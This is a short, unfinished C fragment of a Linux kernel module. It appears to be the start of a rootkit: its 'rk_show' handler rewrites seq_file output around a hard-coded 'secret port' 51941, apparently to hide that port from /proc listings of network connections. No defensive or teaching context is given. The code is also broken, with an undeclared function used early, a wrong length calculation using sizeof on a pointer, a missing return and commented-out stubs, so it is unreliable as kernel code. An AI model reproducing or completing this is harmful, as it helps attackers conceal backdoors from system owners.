#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/seq_file.h>
#define SECREAT_PORT "51941"
static const struct seq_operations seq_ops = {
        .show = rk_show
};
int rk_show(struct seq_file *seq_f, void *v)
{
    char* ptr = strstr(seq_f->buf, SECREAT_PORT);
    if (!ptr)
        return 0;
    seq_f->buf = ptr;
    seq_f->count -= sizeof(ptr);
    //real_show_seq(seq_f, v);
    //hundle regular
}   
